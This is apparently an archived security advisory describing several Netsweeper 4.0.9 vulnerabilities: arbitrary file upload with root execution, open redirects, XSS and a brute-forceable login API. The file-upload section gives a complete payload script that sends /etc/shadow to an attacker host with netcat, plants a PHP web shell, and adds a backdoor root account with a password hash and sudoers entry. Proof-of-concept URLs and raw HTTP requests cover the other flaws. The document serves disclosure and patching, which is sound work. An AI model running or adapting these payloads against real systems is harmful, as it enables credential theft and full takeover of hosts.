@@ -1,0 +1,173 @@
+id: 24027
+date: 08/13/2015
+title: Netsweeper 4.0.9 - Multiple Vulnerabilities
+author: secuid0
+cves: CVE-2014-9605
+
+Netsweeper 4.0.9 - Multiple Vulnerabilities
+
++--------------------------------------------------------+
++ Netsweeper 4.0.9 - Arbitrary File Upload and Execution +
++--------------------------------------------------------+
+Affected Product: Netsweeper
+Vendor Homepage : www.netsweeper.com
+Version 	: 4.0.9 (and probably other versions)
+Discovered by  	: Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
+Patched      	: Yes
+CVE		: [CVE-2015-PENDING]
+Advisory ID	: [SECUID0-15-005]
+
++---------------------+
++ Product Description +
++---------------------+
+Netsweeper is a software solution specialized in content filtering.
+
++----------------------+
++ Exploitation Details +
++----------------------+
+Netsweeeper 4.0.9 (and probably other versions) allows an authenticated user with admin privileges, to upload arbitrary PHP code (eg PHP shell) and further execute it with root rights.
+
+To replicate the bug:
+1. Login as admin at https://<netsweeper>/webadmin
+2. Go to System Tools | System Configuration	
+3. Select "Routes Advertising Service" then Add new Peer, and add the below:
+4. At Peer Address (enter <netsweeper>'s IP, you may also use its default IP 192.168.100.100): 192.168.100.100 
+5. Comment: pwn3d
+6. At File Template (copy and paste the below):
+-----code snippet-----
+#!/bin/sh
+/usr/bin/nc <attacker_ip> 1234 < /etc/shadow
+
+echo "<?php if(isset(\$_REQUEST['c'])){echo \"<pre>\";\$c=(\$_REQUEST['c']);system(\$c);echo \"</pre>\";die;} ?>" > /usr/local/netsweeper/webadmin/logs/secuid0.php
+
+echo "secuid0:x:501:500::/tmp/:/bin/bash" >> /etc/passwd
+#set secuid0 password to "secuid0"
+echo "secuid0:\$1\$h8DmA\$LmWhQ71Bp6u253YOUTdnc0:16452:0:99999:7:::" >> /etc/shadow 
+echo "secuid0     ALL=(ALL)       ALL" >> /etc/sudoers
+
+#secuid0.net
+-----code snippet-----
+
+7. <Click the "Advanced Settings" button to show more fields>
+8. Config file, set it to: /tmp/secuid0.sh
+9. Service Restart Command, set it to: /bin/bash /tmp/secuid0.sh
+10. Set up your netcat listener on port 1234 
+11. Once you submit the above bash script and rest of details ... you will receive a copy of /etc/shadow to your attacker_ip's netcat listener (#10), and also you will be able to interact with the injected php shell from: http://<netsweeper>/webadmin/logs/secuid0.php?c=ls
+
+The injected script /tmp/secuid0.sh will run with root's privileges, so essentially the attacker owns the box and profits.
+	[root@localhost logs]# ls -al /tmp/
+	...
+	-rw-r--r--   1 root   root    219 Feb 30 12:40 secuid0.sh
+	...
+
++-------------------------------------+
++ Netsweeper 4.0.9 - Open Redirection +
++-------------------------------------+
+
+Netsweeper v4.0.9 (and probably earlier versions) accepts a user-controlled input that specifies a link to an external site, and uses that link in a HTTP Redirect.
+
+i) Condition: Unauthenticated Open Redirection
+p0c: https://<netsweeper>/webadmin/authportal/bounce.php?url=http://[domain]
+
+ii) Condition: Authenticated Open Redirection
+p0c: https://<netsweeper>/webadmin/authportal/auth_redirect.php?url=http://[domain]
+
++---------------------------------------------------+
++ Netsweeper 4.0.9 - Cross Site Scripting Injection +
++---------------------------------------------------+
+
+Specific parameters in Netsweeper 4.0.9 (and probably other versions) were identified being vulnerable to XSS injection attacks, details provided below.
+
+i) Condition: Unauthenticated XSS
+p0c: https://<netsweeper>/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=[XSS]&offset=&sortitem=&filter=
+
+ii) Condition: Authenticated XSS
+p0c: https://<netsweeper>/webadmin/admin/addcustomcat.php?catid=[XSS]
+
+iii) Condition: Authenticated XSS
+p0c:POST /webadmin/tools/webapitest.php HTTP/1.1
+Host: <netsweeper>
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9; en-GB; rv:1.9.1) Gecko/20090624 Firefox/3.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-gb,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: https://<netsweeper>/webadmin/tools/webapitest.php
+Cookie: webadmin=naj43nj0sun9suv0dm0nkutpc3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+
+service=http%3A%2F%2Flocalhost%2Fwebadmin%2Fapi%2F%3Fwsdl&apimethod=direct&op=[XSS]&previousOp=login&SEND%3Alogin=on&PARM%3Alogin=a&SEND%3Apassword=on&PARM%3Apassword=a&SEND%3Aformat=on&PARM%3Aformat=a&runfunc=Submit
+
+iv) Condition: Authenticated XSS
+p0c: https://<netsweeper>/webadmin/systemconfig/edit_database_settings.php?dbip=[XSS]&dblogin=[XSS]&dbpassword=[XSS]&dbname=aa
+
+v) Condition: Authenticated XSS
+p0c: POST /webadmin/tools/import.php HTTP/1.1
+Host: <netsweeper>
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9; en-GB; rv:1.9.1) Gecko/20090624 Firefox/3.5
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-gb,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: https://<netsweeper>/webadmin/tools/import.php?impexp=client_manager&back=%2Fwebadmin%2Fadmin%2Fadjclients.php%3Fmenucmd%3DClient%2BManager&section=Policy+Management
+Cookie: webadmin=naj43nj0sun9suv0dm0nkutpc3
+Content-Type: multipart/form-data; boundary=---------------------------3430981424568803991534827968
+Content-Length: 1160
+
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="delimiter_type"
+
+1
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+200000000
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="filename"; filename="hello"
+Content-Type: application/octet-stream
+
+secuid0[XSS]
+secuid0
+
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="section"
+
+Policy Management
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="back"
+
+/webadmin/admin/adjclients.php?menucmd=Client+Manager
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="impexp"
+
+client_manager
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="verbose_flag"
+
+1
+-----------------------------3430981424568803991534827968
+Content-Disposition: form-data; name="step2"
+
+Import
+-----------------------------3430981424568803991534827968--
+
++-----------------------------------------------------+
++ Netsweeper 4.0.9 - Brute-force-able Login Interface +
++-----------------------------------------------------+
+
+Netsweeper v4.0.9 exposes and API that is susceptible to force-forcing, the interface checks the username/password combination against the OS accounts (root, admin etc).  
+
+URL Path: http(s)://<netsweeper>/webadmin/tools/unixlogin.php?login=admin&password=netsweeper
+
+
++----------+
++ Solution +
++----------+
+Upgrade to latest version.
+
+#  0day.today [2023-03-22]  #
